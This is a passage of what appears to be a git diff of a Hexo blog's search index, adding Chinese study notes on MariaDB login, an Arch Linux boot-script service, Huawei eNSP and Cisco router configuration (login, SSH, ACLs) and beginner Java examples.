+<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>centos7</tag>
+        <tag>mariadb</tag>
       </tags>
   </entry>
   <entry>
@@ -519,6 +496,49 @@
       </tags>
   </entry>
   <entry>
+    <title>arch开机启动脚本</title>
+    <url>/2022/02/10/arch%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h2 id="Arch-Linux-添加开机启动脚本"><a href="#Arch-Linux-添加开机启动脚本" class="headerlink" title="Arch Linux 添加开机启动脚本"></a>Arch Linux 添加开机启动脚本</h2><h3 id="0x01-创建一个启动service脚本"><a href="#0x01-创建一个启动service脚本" class="headerlink" title="0x01 创建一个启动service脚本"></a>0x01 创建一个启动service脚本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /usr/lib/systemd/system/rc-local.service</span><br></pre></td></tr></table></figure>
+
+<p>以下是rc-local.service的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=&quot;/etc/rc.local Compatibility&quot;</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/etc/rc.local start</span><br><span class="line">TimeoutSec=0</span><br><span class="line">StandardInput=tty</span><br><span class="line">RemainAfterExit=yes</span><br><span class="line">SysVStartPriority=99</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-创建-etc-rc-local-文件"><a href="#0x02-创建-etc-rc-local-文件" class="headerlink" title="0x02 创建 /etc/rc.local 文件"></a>0x02 创建 /etc/rc.local 文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/rc.local</span><br></pre></td></tr></table></figure>
+
+<p>以下是/etc/rc.local的内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/rc.local</span></span><br><span class="line">if test -d /etc/rc.local.d; then</span><br><span class="line">for rcscript in /etc/rc.local.d/*.sh; do</span><br><span class="line">test -r &quot;$&#123;rcscript&#125;&quot; &amp;&amp; sh $&#123;rcscript&#125;</span><br><span class="line">done</span><br><span class="line">unset rcscript</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启"><a href="#0x03-添加文件执行权限，添加-etc-rc-local-d文件夹，设置开机自启" class="headerlink" title="0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启"></a>0x03 添加文件执行权限，添加/etc/rc.local.d文件夹，设置开机自启</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod a+x /etc/rc.local</span><br><span class="line">sudo mkdir /etc/rc.local.d</span><br><span class="line">sudo systemctl enable rc-local</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-创建sh脚本放在-etc-rc-local-d-文件夹中"><a href="#0x04-创建sh脚本放在-etc-rc-local-d-文件夹中" class="headerlink" title="0x04 创建sh脚本放在/etc/rc.local.d/文件夹中"></a>0x04 创建sh脚本放在/etc/rc.local.d/文件夹中</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/rc.local.d/paru.sh</span><br><span class="line">(编写内容xxxx)</span><br><span class="line">sudo chmod a+x /etc/rc.local.d/paru.sh</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>arch</tag>
+        <tag>开机启动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>eNSP配置</title>
+    <url>/2022/07/26/eNSP%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="路由器设置ip"><a href="#路由器设置ip" class="headerlink" title="路由器设置ip"></a>路由器设置ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view           //进入系统视图</span><br><span class="line">[Huawei]display interface brief     //显示接口信息</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0    //进入接口</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]ip address 192.168.1.254 24     //设置ip地址</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]q    //退出</span><br></pre></td></tr></table></figure>
+
+<h3 id="路由器设置console认证"><a href="#路由器设置console认证" class="headerlink" title="路由器设置console认证"></a>路由器设置console认证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">Enter system view, return user view with Ctrl+Z.</span><br><span class="line">[Huawei]aaa</span><br><span class="line">[Huawei-aaa]local-user ccc password cipher 123</span><br><span class="line">[Huawei-aaa]local-user ccc service-type terminal //设置ccc为终端用户</span><br><span class="line">[Huawei-aaa]q</span><br><span class="line">[Huawei]user-interface console 0  //进入console接口</span><br><span class="line">[Huawei-ui-console0]authentication-mode aaa  //验证模式改为aaa</span><br></pre></td></tr></table></figure>
+
+<h3 id="路由器设置telnet远程登录"><a href="#路由器设置telnet远程登录" class="headerlink" title="路由器设置telnet远程登录"></a>路由器设置telnet远程登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view</span><br><span class="line">[Huawei]aaa     //进入aaa视图</span><br><span class="line">[Huawei-aaa]local-user bbb password cipher 123    //创建用户bbb，设置密码为123</span><br><span class="line">[Huawei-aaa]local-user bbb privilege level 15     //设置用户权限为15</span><br><span class="line">[Huawei-aaa]local-user bbb service-type telnet    //设置用户服务类型telnet</span><br><span class="line">[Huawei-aaa]q             //退出</span><br><span class="line">[Huawei]user-interface vty 0 4      //设置5个人访问路由器</span><br><span class="line">[Huawei-ui-vty0-4]authentication-mode aaa</span><br></pre></td></tr></table></figure>
+<h3 id="路由器设置ssh远程登录"><a href="#路由器设置ssh远程登录" class="headerlink" title="路由器设置ssh远程登录"></a>路由器设置ssh远程登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---服务机</span><br><span class="line">[Huawei]stelnet server enable         //开启ssh服务，默认关闭</span><br><span class="line">[Huawei]rsa local-key-pair create     //创建rsa秘钥</span><br><span class="line">Input the bits in the modulus[default = 512]:1024</span><br><span class="line">[Huawei]aaa</span><br><span class="line">[Huawei-aaa]local-user ccc password cipher 123</span><br><span class="line">[Huawei-aaa]local-user ccc privilege level 15</span><br><span class="line">[Huawei-aaa]local-user ccc service-type ssh</span><br><span class="line">[Huawei-aaa]q</span><br><span class="line">[Huawei]user-interface vty 0 4</span><br><span class="line">[Huawei-ui-vty0-4]authentication-mode aaa</span><br><span class="line">[Huawei-ui-vty0-4]protocol inbound ssh   //开启vty线路的ssh访问功能</span><br><span class="line">[Huawei-ui-vty0-4]q</span><br><span class="line">[Huawei]ssh user ccc authentication-type all   //定义ssh的认证方式</span><br><span class="line">---客户机</span><br><span class="line">[Huawei]ssh client first-time enable    //第一次开启客户端</span><br><span class="line">[Huawei]stelnet 10.1.1.1</span><br></pre></td></tr></table></figure>
+<h3 id="设置空闲时间"><a href="#设置空闲时间" class="headerlink" title="设置空闲时间"></a>设置空闲时间</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Huawei&gt;system-view</span><br><span class="line">[Huawei]user-interface console 0         //进入console 0</span><br><span class="line">[Huawei-ui-console0]idle-timeout 10      //设置空闲时间10分钟</span><br></pre></td></tr></table></figure>
+<h3 id="设置ACL规则"><a href="#设置ACL规则" class="headerlink" title="设置ACL规则"></a>设置ACL规则</h3><ul>
+<li>高级ACL（简单）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]acl 3000            //进入高级acl设置，编号3000</span><br><span class="line">[Huawei-acl-adv-3000]rule 1 deny ip source 192.168.1.1 0 destination 172.20.1.1 0   //0为通配符掩码</span><br><span class="line">[Huawei-acl-adv-3000]q</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]traffic-filter inbound acl 3000  //绑定到接口0/0/0 入口方向</span><br></pre></td></tr></table></figure></li>
+<li>基本ACL<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Huawei]acl 2000            //基本ACL设置，编号2000</span><br><span class="line">[Huawei-acl-basic-2000]rule 1 deny source 192.168.1.2 0   //拒绝192.168.1.2流量</span><br><span class="line">[Huawei-acl-basic-2000]rule 2 permit source 192.168.1.1 0   //允许192.168.1.1流量</span><br><span class="line">[Huawei-acl-basic-2000]rule permit   //全部允许</span><br><span class="line">[Huawei-acl-basic-2000]q</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]traffic-filter outbound acl  2000   //绑定到0/0/1的出口方向</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>eNSP</tag>
+        <tag>华为</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>first-blog</title>
     <url>/2021/11/24/first-blog/</url>
     <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
@@ -527,6 +547,81 @@
 ]]></content>
       <tags>
         <tag>test</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cisco配置</title>
+    <url>/2022/08/01/cisco%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><h3 id="设置console密码"><a href="#设置console密码" class="headerlink" title="设置console密码"></a>设置console密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable                     //特权模式</span><br><span class="line">Router#configure terminal         //全局模式</span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line">Router(config)#line console 0     //进入0号控制台</span><br><span class="line">Router(config-line)#password 111  //设置密码111</span><br><span class="line">Router(config-line)#login         //开启密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/console%E5%AF%86%E7%A0%81.JPG" alt="console 密码"></p>
+<h3 id="设置特权模式密码"><a href="#设置特权模式密码" class="headerlink" title="设置特权模式密码"></a>设置特权模式密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line">Router(config)#enable password 111  //设置明文密码</span><br><span class="line">Router(config)#enable secret 222    //设置加密密码，会导致password失效</span><br><span class="line">Router(config)#login                //开启密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/%E7%89%B9%E6%9D%83%E5%AF%86%E7%A0%81.JPG" alt="特权密码"></p>
+<h3 id="设置远程登录telnet密码"><a href="#设置远程登录telnet密码" class="headerlink" title="设置远程登录telnet密码"></a>设置远程登录telnet密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#line vty 0 4         //设置0-4（共5个）用户可以进行Telnet登录</span><br><span class="line">Router(config-line)#password 111    //设置密码111</span><br><span class="line">Router(config-line)#login local     //开启密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet%20%E5%AF%86%E7%A0%81.JPG" alt="telnet 密码"></p>
+<h3 id="设置远程登录telnet用户名和密码"><a href="#设置远程登录telnet用户名和密码" class="headerlink" title="设置远程登录telnet用户名和密码"></a>设置远程登录telnet用户名和密码</h3><ul>
+<li>登录权限为普通</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#username aaa password cisco   //非加密</span><br><span class="line">Router(config)#username aaa secret cisco     //加密</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#login  local</span><br></pre></td></tr></table></figure>
+<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90.JPG" alt="telnet-特权模式"></p>
+<h3 id="设置远程登录telnet用户名和密码（特权模式）"><a href="#设置远程登录telnet用户名和密码（特权模式）" class="headerlink" title="设置远程登录telnet用户名和密码（特权模式）"></a>设置远程登录telnet用户名和密码（特权模式）</h3><ul>
+<li>登录后为特权模式</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#username ddd privilege 15 secret ddd</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#login  local</span><br><span class="line">Router(config-line)#no password     //取消telnet远程登录</span><br><span class="line">Router(config-line)#no login        //不进行密码检查</span><br></pre></td></tr></table></figure>
+<p><img src="https://121.5.125.62:88/image/cisco-%E8%B7%AF%E7%94%B1%E5%99%A8%E8%AE%BE%E7%BD%AE%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/telnet-user-password.JPG" alt="telnet-user-password"></p>
+<h3 id="登录超时自动断开"><a href="#登录超时自动断开" class="headerlink" title="登录超时自动断开"></a>登录超时自动断开</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#line vty 0 4</span><br><span class="line">Router(config-line)#exec-timeout 20 0    //20分钟0秒自动断开</span><br></pre></td></tr></table></figure>
+
+<h3 id="登录次数限制与时间锁定"><a href="#登录次数限制与时间锁定" class="headerlink" title="登录次数限制与时间锁定"></a>登录次数限制与时间锁定</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#login block-for 1800 attempts 10 within 600    //600秒内登录错误10次，锁定1800秒</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置ssh登录"><a href="#配置ssh登录" class="headerlink" title="配置ssh登录"></a>配置ssh登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#hostname router1  </span><br><span class="line">router1(config)#ip domain-name neoshi.net  //必须要先设置hostname和domain才能进行下一步</span><br><span class="line">router1(config)#crypto key generate rsa</span><br><span class="line">The name for the keys will be: router1.neoshi.net</span><br><span class="line">Choose the size of the key modulus in the range of 360 to 2048 for your</span><br><span class="line">  General Purpose Keys. Choosing a key modulus greater than 512 may take</span><br><span class="line">  a few minutes.</span><br><span class="line"></span><br><span class="line">How many bits in the modulus [512]: 1024    //生成1024rsa秘钥，支持360-2048</span><br><span class="line">% Generating 1024 bit RSA keys, keys will be non-exportable...[OK]</span><br><span class="line"></span><br><span class="line">Router(config)#username aaa secret aaa</span><br><span class="line">Router(config)#ip ssh authentication-retries 4   //设置ssh认证次数为4，可以为0-5之间</span><br><span class="line">router1(config)#line vty 0 4</span><br><span class="line">*3? 1 0:14:8.8:  %SSH-5-ENABLED: SSH 1.99 has been enabled</span><br><span class="line">router1(config-line)#login local</span><br><span class="line">router1(config-line)#transport input ssh     //设置登录模式为ssh，默认为all</span><br></pre></td></tr></table></figure>
+
+<h3 id="privilege等级介绍"><a href="#privilege等级介绍" class="headerlink" title="privilege等级介绍"></a>privilege等级介绍</h3><h4 id="privilege等级切换"><a href="#privilege等级切换" class="headerlink" title="privilege等级切换"></a>privilege等级切换</h4><ul>
+<li>privilege一共有15个等级，没有enable密码的情况下，不能从低等级切换到高等级，否则会报错<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router1&gt;en 2</span><br><span class="line"> % Error in authentication.</span><br></pre></td></tr></table></figure></li>
+<li>加入需要从en 0切换到en 3 ，需要回到en 15 为en 3 设置一个密码，然后进行切换<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router1&gt;en 15</span><br><span class="line">Router1#configure terminal</span><br><span class="line">router1(config)#enable secret level 3 a  //为en 3 设置密码为a</span><br><span class="line">router1&gt;en 3</span><br><span class="line">Password:</span><br><span class="line">router1#           //不同的级别使用的命令会不一样</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="配置日志服务器"><a href="#配置日志服务器" class="headerlink" title="配置日志服务器"></a>配置日志服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">router1(config)#logging on                 //打开日志服务</span><br><span class="line">router1(config)#logging trap debugging     //设置等级为debugging</span><br><span class="line">router1(config)#logging x.x.x.x           //设置日志服务器地址</span><br><span class="line">router1(config)#service timestamps log datetime  //设置时间戳</span><br></pre></td></tr></table></figure>
+
+<h3 id="路由器配置"><a href="#路由器配置" class="headerlink" title="路由器配置"></a>路由器配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#interface FastEthernet0/0</span><br><span class="line">Router(config-if)#ip address 10.1.1.254 255.255.255.0  //绑定地址</span><br><span class="line">Router(config-if)#no shutdown    //启动接口</span><br><span class="line">Router(config-if)#ip route 目的地址 子网掩码 路由器下一跳      //设置静态路由</span><br></pre></td></tr></table></figure>
+
+<h3 id="ACL配置"><a href="#ACL配置" class="headerlink" title="ACL配置"></a>ACL配置</h3><h4 id="标准ACL"><a href="#标准ACL" class="headerlink" title="标准ACL"></a>标准ACL</h4><ul>
+<li>顺序匹配原则</li>
+<li>标准访问控制列表因为只能限制源IP地址，因此应该把ACL放到离目标最近的端口出方向上。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#access-list 1 deny 192.168.1.1   //拒绝192.168.1.1流量</span><br><span class="line">Router(config)#access-list 1 permit any         //允许任何流量通过</span><br><span class="line">Router(config)#interface fastEthernet 0/1       //进入接口0/1</span><br><span class="line">Router(config-if)#ip access-group 1 out         //设置ACL为出方向</span><br></pre></td></tr></table></figure>
+<h4 id="扩展ACL"><a href="#扩展ACL" class="headerlink" title="扩展ACL"></a>扩展ACL</h4></li>
+<li>扩展ACL可以对数据包中的源、目标IP地址以及端口号进行检查，所以可以将该ACL放置在通信路径中的任一位置。但是，如果放到离目标近的地方，每台路由器都要对数据进行处理，会更多的消耗路由器和带宽资源。放到离源最近的路由器端口入方向直接就将拒绝数据丢弃，可以减少其他路由器的资源占用以及带宽占用。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Router&gt;enable</span><br><span class="line">Router#configure terminal</span><br><span class="line">Router(config)#access-list 100 deny tcp host 192.168.1.1 host 172.20.1.1 eq www   //拒绝从192.168.1.1发到172.20.1.1的tcp协议，端口为80</span><br><span class="line">Router(config)#access-list 100 permit ip any any   //允许任何流量</span><br><span class="line">Router(config)#interface fastEthernet 0/0   //设置接口为0/0</span><br><span class="line">Router(config-if)#ip access-group 100 in    //设置ACL为入方向</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>cisco</tag>
+        <tag>路由器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java学习笔记</title>
+    <url>/2022/08/03/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> hello_world;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> datademo1;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">datatype1</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//byte：8位，最大存储数据量是255，存放的数据范围是-128~127之间。</span></span><br><span class="line">		<span class="comment">//short：16位，最大数据存储量是65536，数据范围是-32768~32767之间。</span></span><br><span class="line">		<span class="comment">//int：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。</span></span><br><span class="line">		<span class="comment">//long：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。</span></span><br><span class="line">		<span class="comment">//float：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。</span></span><br><span class="line">		<span class="comment">//double：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。</span></span><br><span class="line">		<span class="comment">//boolean：只有true和false两个取值。</span></span><br><span class="line">		<span class="comment">//char：16位，存储Unicode码，用单引号赋值。</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">byte</span> a =<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">		<span class="keyword">short</span> b = <span class="number">32767</span>;</span><br><span class="line">		<span class="keyword">int</span> c=<span class="number">234441</span>;</span><br><span class="line">		<span class="comment">//数字后加L</span></span><br><span class="line">		<span class="keyword">long</span> d=<span class="number">45646645546546L</span>;</span><br><span class="line">		<span class="comment">//数字后加F</span></span><br><span class="line">		<span class="keyword">float</span> e=<span class="number">3.2f</span>;</span><br><span class="line">		<span class="keyword">double</span> f=<span class="number">52.2</span>;</span><br><span class="line">		<span class="keyword">boolean</span> g=<span class="keyword">true</span>;</span><br><span class="line">		<span class="keyword">char</span> h=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="键盘输入-整数"><a href="#键盘输入-整数" class="headerlink" title="键盘输入(整数)"></a>键盘输入(整数)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> input;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner sc  = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		<span class="keyword">int</span> i = sc.nextInt();</span><br><span class="line">		System.out.print(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">				<span class="comment">//定义数组</span></span><br><span class="line">        <span class="keyword">int</span> [] a =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[I@119d7047</span></span><br><span class="line"><span class="comment">[表示数组</span></span><br><span class="line"><span class="comment">I表示类型int</span></span><br><span class="line"><span class="comment">@表示间隔符，固定格式</span></span><br><span class="line"><span class="comment">119d7047真正的地址值</span></span><br><span class="line"><span class="comment">变量可覆盖</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h4 id="数组长度"><a href="#数组长度" class="headerlink" title="数组长度"></a>数组长度</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> [] a =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            System.out.println(a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数组名.length得出数组长度</span></span><br></pre></td></tr></table></figure>
+<h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] a = <span class="keyword">new</span> String[<span class="number">100</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">整数类型初始化为0</span></span><br><span class="line"><span class="comment">小数类型初始化为0.0</span></span><br><span class="line"><span class="comment">字符类型初始化为&#x27;\u0000&#x27;</span></span><br><span class="line"><span class="comment">布尔类型 false</span></span><br><span class="line"><span class="comment">引用类型 null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a =<span class="number">10</span>;</span><br><span class="line">        System.out.println(test(a));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num&gt;<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
